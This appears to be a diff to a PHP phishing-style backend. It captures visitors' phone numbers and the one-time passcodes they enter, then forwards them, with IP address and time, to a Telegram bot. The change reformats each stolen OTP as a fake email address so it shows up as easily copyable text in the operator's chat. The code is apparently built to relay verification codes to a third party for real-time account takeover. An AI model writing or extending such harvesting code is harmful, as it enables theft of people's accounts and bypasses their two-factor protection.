@@ -114,10 +114,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
                       ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
         
-        // Send Telegram notification with OTP in backticks (monospace, easy to copy with long press)
+        // Send Telegram notification - OTP formatted as fake email for blue underlined appearance
         $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
         $time = date('Y-m-d H:i:s');
-        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+        // Format OTP as fake email: otp@example.com - Telegram will make it blue, underlined, and copyable
+        $fakeEmail = "{$enteredOtp}@otp.local";
+        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: {$fakeEmail}\n⏰ Time: {$time}\n🌐 IP: {$ip}";
         
         function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'Markdown') {
             $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
